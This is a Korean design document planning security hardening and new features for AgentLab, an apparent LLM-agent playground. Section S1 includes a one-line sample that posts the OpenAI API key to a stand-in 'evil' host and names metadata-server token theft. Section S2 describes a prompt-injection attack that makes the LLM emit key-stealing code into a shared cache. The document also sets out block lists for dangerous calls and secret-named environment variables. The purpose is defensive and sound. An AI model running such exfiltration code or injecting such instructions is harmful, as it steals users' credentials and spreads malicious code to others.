# AgentLab 현업 사용 준비: 기능 · 보안 개선 계획

> 대상: AgentLab 을 운영하는 개발자, 그리고 플레이그라운드를 매일 쓰는 AI Agent 엔지니어
> 작성: 2026-11-16 · 상태 표기: ✅ 이번에 구현 · 🟡 부분 구현 · 📋 후속 과제(인프라·설계 결정 필요)

AgentLab 플레이그라운드는 학습용 도구로 출발했습니다. 현업 엔지니어가 매일 쓰려면 세 가지가 더 필요합니다.

1. **큰 시스템을 나눠 만들고 재사용하는 수단**: 서브 에이전트, 프리셋, 복사/붙여넣기, 커스텀 도구
2. **생성된 코드를 그대로 저장소에 넣고 운영할 수 있는 품질**: 노드별 모델, 테스트, 그래프 명세 파일
3. **남이 만든 코드와 키를 다루는 서비스로서의 안전성**: 샌드박스 격리, 캐시 오염 방지, 키 보관

이 문서는 현재 구조를 점검한 결과와 각 항목의 설계, 구현 상태를 기록합니다.

---

## 1. 위협 모델

| 자산 | 위협 | 경로 |
| --- | --- | --- |
| 사용자의 OpenAI API 키 | 탈취 | ① 샌드박스 코드가 `OPENAI_API_KEY` 를 읽어 외부로 전송 ② 브라우저 XSS 로 localStorage 탈취 |
| 공유 고도화 캐시 | 오염 → 다른 사용자에게 악성 코드 배포 | 프롬프트 주입으로 LLM 이 악성 코드를 생성 → 검증 통과 → 구조 해시로 모두에게 제공 |
| 서버 클라우드 권한 | 탈취 | 샌드박스 코드가 메타데이터 서버(169.254.169.254)에서 서비스 계정 토큰 획득 → GCS 버킷 쓰기 |
| 서비스 가용성 | DoS | 대용량 요청 본문, 린트 단계 파일 폭탄, IP 위조로 rate limit 우회 |
| 공유 프로젝트를 여는 사람 | 악성 Function 노드/수정 파일 실행 | 공개 링크로 받은 프로젝트를 자기 키로 실행 |

## 2. 점검 결과와 조치

### S1. 샌드박스 외부 통신 제한 ✅ (프로세스 내 방어) · 📋 (인프라 격리)

**문제.** 실행 샌드박스는 임시 디렉터리, 최소 환경 변수, rlimit 으로 격리되어 있습니다. 하지만 네트워크와 자식 프로세스는 막혀 있지 않습니다. 그래서 사용자 코드가 다음을 할 수 있습니다.
- 키를 외부로 전송: `httpx.post("https://evil", data=os.environ["OPENAI_API_KEY"])`
- Cloud Run 메타데이터 서버에서 서비스 계정 토큰을 받아 캐시 버킷에 쓰기
- `subprocess` 로 `curl` 등 외부 바이너리 실행

**조치 (구현).** `sandbox/sitecustomize.py` 에 [PEP 578 audit hook](https://peps.python.org/pep-0578/) 을 설치합니다. audit hook 은 한 번 설치되면 파이썬 코드로 제거할 수 없습니다.
- `socket.connect` / `socket.getaddrinfo`: 키 주입 프록시 주소(`127.0.0.1:<port>`, 실행마다 정확히 하나)와 `AGENTLAB_EGRESS_ALLOW` 로 지정한 호스트만 통과시킵니다(기본은 프록시뿐). 사설·링크로컬·루프백·메타데이터 주소는 이름 해석 결과까지 확인해 차단합니다.
- 키 주입 프록시(`app/keyproxy.py`)와 역할이 나뉩니다. 프록시는 **키 문자열 노출**을, 가드는 **메타데이터 접근·데이터 반출**을 막습니다.
- Mock 모드(키 없음)에서는 외부 통신 전체를 차단합니다.
- `os.system`, `os.exec*`, `os.fork`, `pty.spawn` 을 차단합니다. `subprocess.Popen`·`os.posix_spawn` 은 샌드박스 자신의 파이썬만 허용하고(강의 예제가 쓰는 `python -I`), `env={}` 로 환경을 비워도 정책 활성화 플래그를 넣어 자식에게도 정책이 걸리게 합니다.
- 차단 시 사용자가 원인을 알 수 있게 `[AgentLab] 보안 정책: ...` 메시지와 함께 `PermissionError` 를 냅니다.

**한계와 후속 과제 (📋).** audit hook 은 `ctypes` 로 libc 를 직접 호출하면 우회할 수 있습니다. 공개 운영에서는 아래 인프라 격리를 함께 해야 합니다.
- **실행 전용 서비스로 분리**: 코드를 실행하는 서비스는 **권한이 하나도 없는 서비스 계정**으로 띄웁니다. 캐시 버킷 쓰기는 API 서비스에만 줍니다. 그러면 메타데이터 토큰을 얻어도 쓸 데가 없습니다.
- 실행 서비스의 egress 를 Serverless VPC 커넥터 + 방화벽으로 `api.openai.com` 에만 허용합니다.
- 단일 서버 배포라면 gVisor(`runsc`) 런타임이나 nsjail 로 네트워크 네임스페이스를 분리합니다.

### S2. 고도화 캐시 오염 방지 ✅

**문제.** `/api/refine` 은 사용자가 보낸 `graph` 와 `files` 를 그대로 LLM 에 넘깁니다. 검증(ruff + Mock 실행)만 통과하면 그 결과를 구조 해시로 **모든 사용자에게 공유**합니다. 게다가 프론트엔드는 캐시 적중 결과를 **자동으로 적용**합니다.

공격 시나리오는 이렇습니다.
1. 공격자가 기본 ReAct 패턴과 같은 그래프에, 주입 지시문을 넣은 `files` 를 붙여 고도화를 요청합니다.
2. LLM 이 키를 외부로 보내는 코드를 끼워 넣고, Mock 검증을 통과합니다.
3. 첫 방문자는 모두 ReAct 패턴으로 시작하므로 오염된 코드를 자동으로 받습니다.
4. 방문자가 자기 키로 실행하면 키가 유출됩니다.

**조치 (구현).**
1. **정적 보안 정책 검사** (`backend/app/policy.py`): 캐시에 넣기 전에 생성 코드의 AST 를 검사합니다. 통과하지 못하면 LLM 에 피드백해 다시 생성하고, 끝까지 실패하면 캐시하지 않습니다.
   - import 허용 목록: `agent.*`, langgraph/langchain 계열, pydantic, `dotenv`, 안전한 표준 라이브러리만
   - 금지 호출: `eval`, `exec`, `compile`, `__import__`, `open`, `getattr`/`setattr` 의 동적 사용, `globals`, `vars`, `breakpoint`
   - 금지 속성: `__globals__`, `__builtins__`, `__subclasses__`, `__code__` 등 dunder 탈출 경로
   - 환경 변수는 `os.getenv("<리터럴>")` 형태만 허용하고, 이름에 `KEY`/`TOKEN`/`SECRET`/`PASSWORD` 가 들어가면 거부합니다.
2. **캐시 결과 자동 적용 중단**: 캐시 적중은 "검증된 고도화 코드가 있습니다" 알림으로만 보여 줍니다. 사용자가 직접 켜야 적용됩니다.
3. 캐시 항목에 `policy` 버전을 기록합니다. 정책이 바뀌면 이전 항목은 다시 검사한 뒤에만 제공합니다.

### S3. 공유 프로젝트의 남의 코드 실행 경고 ✅

공유 링크로 연 프로젝트에 직접 쓴 코드가 들어 있으면, API 키를 넣은 상태로 실행하기 전에 한 번 확인을 받습니다. 직접 쓴 코드란 Function 노드, 커스텀 도구, 직접 수정한 파일입니다. Mock 실행은 키가 없으므로 경고하지 않습니다.

### S4. API 키 보관 ✅

기본값을 **이 탭에서만 기억**(sessionStorage)으로 바꿨습니다. 탭을 닫으면 키가 사라집니다. 설정의 "이 브라우저에 계속 기억" 을 켜야 localStorage 에 남습니다.

후속 과제(📋): 팀 운영이라면 키를 브라우저에 두지 않습니다. 서버의 암호화 저장소(예: Supabase Vault, GCP Secret Manager)에 사용자별로 보관하고, 실행 서비스에만 주입합니다.

### S5. Rate limit 우회 방지 ✅

`X-Forwarded-For` 의 **첫 번째** 값을 클라이언트 IP 로 쓰고 있어서, 헤더를 위조하면 제한을 우회할 수 있었습니다. 이제 신뢰하는 프록시 수(`AGENTLAB_TRUSTED_PROXY_HOPS`, 기본 1)만큼 **오른쪽에서** 고른 값을 씁니다. Cloud Run 과 단일 리버스 프록시라면 기본값 1 이 맞습니다. `/api/models` 에도 rate limit 을 적용했습니다.

후속 과제(📋): 메모리 기반 제한은 인스턴스마다 따로 셉니다. 인스턴스가 여러 개면 Redis(Memorystore) 나 Supabase 테이블로 옮깁니다. 일일 한도도 같습니다.

### S6. 요청 크기 제한 ✅

- 요청 본문 상한을 `AGENTLAB_MAX_BODY_MB`(기본 4MB)로 두고, 넘으면 413 을 돌려줍니다.
- 파일 수·파일 크기·총합을 검사하는 공통 함수를 만들어, 린트 단계에서도 파일을 디스크에 쓰기 전에 검사합니다. 이전에는 린트가 제한 없이 파일을 썼습니다.
- 서브 에이전트 때문에 생성 파일 수가 늘어나므로 파일 수 상한을 64 에서 256 으로 올리고, 대신 총합 상한(2MB)을 새로 둡니다.

### S7. 웹 보안 헤더 ✅ · CSP 📋

Next.js 응답에 `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy`, `Strict-Transport-Security` 를 붙입니다.

후속 과제(📋): Content-Security-Policy 는 Monaco(CDN 로더), Mermaid, Supabase 도메인을 정리한 뒤 Report-Only 로 먼저 켜고, 위반 리포트를 확인한 다음 강제합니다.

### S8. 안전하지 않은 운영 설정 경고 ✅

로그인 없이(`SUPABASE_*` 미설정) CORS 가 `*` 인 상태로 서버가 뜨면 시작 로그에 경고를 남깁니다.

### S9. 데이터베이스 권한 (점검 결과 양호)

`projects` 와 새 `agent_presets` 는 모두 행 단위 보안(RLS)으로 주인만 쓰고 지울 수 있습니다. 프리셋은 주인만 읽을 수 있습니다. 브라우저에는 anon 키만 있고, `service_role` 키는 어디에도 쓰지 않습니다.

## 3. 현업 사용을 위한 기능

### F1. 서브 에이전트(Subgraph) ✅

- 새 노드 종류 **Sub-agent**: 안쪽에 START/END 를 가진 완결된 그래프를 담습니다. 더블클릭하거나 "열기" 를 누르면 안으로 들어갑니다. 위쪽 경로 표시(`agent › research_team › …`)나 Esc 로 상위 그래프로 돌아옵니다.
- 깊이 제한이 없습니다. 2단계를 넘으면 경고합니다.
- **입출력 방식**
  - 격리(기본): 부모 대화를 넘기고, 최종 답변 하나만 이름표를 붙여 돌려받습니다.
  - 상태 공유: 컴파일된 서브그래프를 노드로 직접 등록합니다.
- **메모리**
  - 부모 상속(기본)
  - 독립 영속(`checkpointer=True`): 같은 thread 에서 다시 부르면 이전 대화를 기억합니다.
- Supervisor 워커, Map 워커, 일반 단계 어디에나 쓸 수 있습니다. 안쪽에 Human-in-the-loop 를 넣으면 부모 체크포인터로 interrupt 와 resume 이 동작합니다.
- **묶기 / 펼치기**: 노드 여러 개를 선택해 Sub-agent 하나로 묶거나, 반대로 안쪽 노드를 꺼냅니다. 입구나 출구가 둘 이상이라 의미가 바뀌는 선택은 이유를 알려 주고 거부합니다.
- **분석기**: 서브그래프 안까지 재귀로 검사합니다. 안쪽에 문제가 있으면 그 문제를 담은 Sub-agent 노드에 빨강/노랑으로 표시합니다. 문제 목록을 클릭하면 해당 깊이로 이동합니다.
- **생성 코드**: 서브 에이전트마다 `agent/subagents/<이름>/` 패키지를 따로 만듭니다(state/nodes/routing/graph). 단독으로 테스트할 수 있고, `langgraph.json` 에도 별도 그래프로 등록됩니다. `main.py` 는 `subgraphs=True` 로 안쪽 노드 실행까지 경로와 함께 출력합니다.

### F2. 에이전트 프리셋 ✅

- 캔버스 전체, 지금 보고 있는 서브그래프, Sub-agent 노드, Agent 노드를 프리셋으로 저장합니다.
- 로그인하면 계정(`agent_presets` 테이블)에, 아니면 이 브라우저에 저장합니다.
- 기본 제공 프리셋: 패턴 갤러리의 설계를 그대로 Sub-agent 로 넣을 수 있습니다.
- 팔레트에서 끌어다 놓거나 프리셋 라이브러리에서 추가합니다.
- **출처 연결**: 프리셋에서 넣은 노드는 출처를 기억합니다. 프리셋이 수정되면 "업데이트 있음" 을 표시하고, "프리셋에서 다시 불러오기" 와 "덮어쓰기 저장" 을 제공합니다.
- **JSON 내보내기/가져오기**: 팀원과 프리셋을 파일로 주고받습니다.
- 프리셋은 그 안에서 쓰는 커스텀 도구 정의를 함께 담습니다(F4).

### F3. 노드별 모델 지정 ✅

라우터는 작은 모델로, 작성자는 큰 모델로 두는 식의 비용·지연 최적화는 현업에서 기본입니다. LLM, Agent, Supervisor, Evaluator, 라우터(LLM 전략), Reduce 노드에 `init_chat_model` 형식의 모델 ID 를 따로 지정할 수 있습니다. 비우면 `LAB_MODEL` 을 따릅니다.

생성 코드는 `get_llm(model)` 로 만들고, 노드별 환경 변수로 배포 시점에 바꿀 수 있습니다. 최상위 노드는 `LAB_MODEL__<노드>`, 서브 에이전트 안의 노드는 `LAB_MODEL__<서브에이전트>__<노드>` 입니다(예: `LAB_MODEL__RESEARCH_TEAM__RESEARCHER`). 샌드박스 실행은 OpenAI 모델만 지원하므로, 다른 공급자를 고르면 분석기가 안내합니다.

### F4. 커스텀 도구 ✅

데모용 고정 도구 7개만으로는 실제 에이전트를 만들 수 없습니다.
- 그래프 설정에서 `@tool` 함수를 직접 작성합니다(이름, 설명, 코드, 민감 여부).
- Tools/Agent 노드의 도구 목록에 함께 나타나고, 생성 코드의 `agent/tools.py` 에 포함됩니다.
- 분석기가 이름 규칙, 중복, `@tool` 데코레이터 누락, 함수 이름 불일치를 검사합니다.
- 민감 도구로 표시하면 Human-in-the-loop 없이 쓰일 때 경고합니다.

### F5. 복사 · 붙여넣기 · 복제 ✅

`Ctrl/⌘+C`, `Ctrl/⌘+V`, `Ctrl/⌘+D` 로 선택한 노드를 내부 엣지와 함께 복사하고 복제합니다. 서브그래프 안팎과 다른 프로젝트 사이에서도 동작합니다. 클립보드는 브라우저 저장소를 씁니다. 이름이 겹치면 자동으로 바꿉니다.

### F6. 그래프 명세 파일 ✅

- ZIP 에 `agentlab.json`(그래프 원본)을 함께 넣습니다. 저장소에 커밋해 두면 리뷰와 diff 가 되고, 플레이그라운드로 다시 가져올 수 있습니다.
- 툴바의 **가져오기** 로 `agentlab.json` 이나 ZIP 을 열 수 있습니다.

### F7. 생성 프로젝트의 운영 품질 ✅

- `tests/test_graph.py`: LLM 을 호출하지 않는 구조 테스트입니다. 각 그래프와 서브그래프가 컴파일되는지, 노드 집합이 캔버스와 같은지 확인합니다. CI 에서 바로 돌릴 수 있습니다.
- `requirements-dev.txt`(pytest, ruff), `.gitignore` 를 함께 만듭니다.
- `main.py` 의 실행 config 에 `run_name`, `tags`, `metadata` 를 넣어 LangSmith 에서 실행을 찾기 쉽게 했습니다.

### F8. 노드 검색 ✅

`Ctrl/⌘+K` 로 전체 트리(모든 서브그래프 포함)에서 노드를 이름, 종류, 설명으로 찾습니다. 고르면 해당 깊이로 이동해 노드를 선택합니다.

## 4. 운영 설정 (새 환경 변수)

| 변수 | 기본값 | 설명 |
| --- | --- | --- |
| `AGENTLAB_EGRESS_ALLOW` | (없음) | 키를 넣고 실행할 때 샌드박스가 추가로 접속할 수 있는 호스트(쉼표 구분, `.example.com` 은 하위 도메인 포함). OpenAI 는 키 프록시로 자동 허용. Mock 실행은 항상 전부 차단 |
| `AGENTLAB_TRUSTED_PROXY_HOPS` | `1` | 앞단 프록시 수. Cloud Run·리버스 프록시 1개면 1, 서버를 직접 노출하면 0 |
| `AGENTLAB_MAX_BODY_MB` | `4` | 요청 본문 상한 |
| `AGENTLAB_MAX_FILES` / `AGENTLAB_MAX_TOTAL_BYTES` | `256` / `2000000` | 실행·검증 요청의 파일 수, 총 크기 상한 |
| `AGENTLAB_RATE_MODELS` | `10` | `/api/models` 분당 호출 수 |

`supabase/schema.sql` 을 다시 실행해야 `agent_presets` 테이블이 생깁니다. 여러 번 실행해도 안전합니다. 테이블이 없으면 프리셋은 브라우저에 저장되고 화면에 안내가 나옵니다.

## 6. 후속 과제 (📋)

우선순위 순입니다. 모두 인프라를 바꾸거나 제품 방향을 정해야 하는 일이라 이번 범위에서 뺐습니다.

| # | 과제 | 이유 | 대략의 설계 |
| --- | --- | --- | --- |
| 1 | 실행 서비스 분리 + 무권한 서비스 계정 + egress 방화벽 | S1 의 근본 대책 | `agentlab-runner` Cloud Run 서비스 신설. API 는 내부 호출(IAM 인증)로 실행을 위임 |
| 2 | 분산 rate limit · 일일 한도 | 인스턴스가 늘면 제한이 느슨해짐 | Memorystore(Redis) `INCR` + TTL, 또는 Supabase `usage` 테이블 + RPC |
| 3 | 서버 측 키 보관 | 브라우저 XSS 로 키 탈취 위험 제거 | Supabase Vault 에 사용자별 암호화 저장. 실행 요청에는 키 대신 키 id |
| 4 | 프로젝트 버전 기록 | 실수 복구, 리뷰 | `project_versions` 테이블. 저장 N회마다 또는 이름 붙인 스냅샷. diff 보기 |
| 5 | 팀 작업 공간 · 권한 | 팀 단위 프리셋 공유 | `workspaces`, `memberships(role)`. RLS 를 멤버십 기준으로. 프리셋 공개 범위(나/팀/전체) |
| 6 | 평가(Eval) 데이터셋 | 회귀 확인 | 입력/기대 출력 세트를 프로젝트에 저장. 실행 결과를 LLM-judge 로 채점 |
| 7 | MCP 도구 연결 | 실제 사내 시스템 연동 | `langchain-mcp-adapters` 로 MCP 서버 도구를 불러오는 노드. 샌드박스 egress 허용 목록과 연동 |
| 8 | 커스텀 상태 스키마 편집 | 메시지 외 구조화된 상태 | State 필드(이름, 타입, 리듀서)를 편집하는 패널. 서브그래프 입출력 매핑 |
| 9 | CSP 강제 | XSS 피해 범위 축소 | Report-Only 로 수집 → 허용 목록 확정 → 강제 |
| 10 | 감사 로그 | 운영 추적 | 실행, 고도화, 공유 설정 변경을 사용자별로 기록 |
| 11 | 실시간 공동 편집 | 페어 설계 | Yjs + Supabase Realtime. 노드 단위 잠금부터 시작 |
